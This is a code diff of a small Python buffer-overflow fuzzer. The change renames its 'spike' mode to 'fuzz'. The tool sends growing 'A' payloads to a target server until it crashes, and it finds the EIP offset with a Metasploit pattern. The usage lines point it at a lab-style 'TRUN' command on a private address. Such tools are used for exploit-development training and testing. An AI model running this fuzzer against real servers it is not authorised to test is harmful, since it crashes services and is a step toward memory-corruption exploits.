@@ -3,8 +3,8 @@ A dumb buffer overflow script that fuzzes target server.
 I've also integrated `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` into this
 
 Usage:
-- Spike:
-    python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode spike
+- Fuzz:
+    python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode fuzz
 
 - Offset + EIP interpretation:
     python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400
@@ -12,7 +12,6 @@ Usage:
 
 import argparse
 import socket
-from sys import prefix
 from time import sleep
 from math import ceil
 
@@ -20,7 +19,7 @@ MAX_BYTES = 1024 * 1024  # 1MB
 
 
 # Find out the amount of bytes it takes for the target program to crash
-def spike(target: str, port: int, expect_resp: bool, stride: int, command_prefix: str, timeout_secs: int) -> int:
+def fuzz(target: str, port: int, expect_resp: bool, stride: int, command_prefix: str, timeout_secs: int) -> int:
     payload = "A" * stride
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -80,7 +79,7 @@ parser = argparse.ArgumentParser(description="Dumb fuzzing tool")
 # Arguments
 # -- Mode --
 parser.add_argument("--mode", type=str,
-                    help="[required] attack mode: spike|offset")
+                    help="[required] attack mode: fuzz|offset")
 # -- Target --
 parser.add_argument("--target", type=str, help="[required] target server")
 parser.add_argument("--port", type=int, help="[required] target port")
@@ -91,9 +90,9 @@ parser.add_argument("--timeout", type=bool,
                     help="[optional] timeout in seconds if program didn't respond. default 5", default=5)
 parser.add_argument("--prefix", type=str,
                     help="[optional] command prefix. default empty", default="")
-# -- Spike --
+# -- Fuzz --
 parser.add_argument("--stride", type=int,
-                    help="[optional] number in bytes to increment for each spike iteration. default 100", default=100)
+                    help="[optional] number in bytes to increment for each fuzzing iteration. default 100", default=100)
 # -- Offset --
 parser.add_argument("--length", type=int,
                     help="[optional] unique pattern of strings at given length to be sent. default 2000", default=2000)
@@ -102,9 +101,9 @@ parser.add_argument("--length", type=int,
 args = parser.parse_args()
 
 mode = args.mode.lower()
-if mode == "spike":
-    len_crash_bytes = spike(args.target, args.port,
-                            args.resp, args.stride, args.prefix, args.timeout)
+if mode == "fuzz":
+    len_crash_bytes = fuzz(args.target, args.port,
+                           args.resp, args.stride, args.prefix, args.timeout)
     print("Program crashed at %s bytes", len_crash_bytes)
 
 elif mode == "offset":
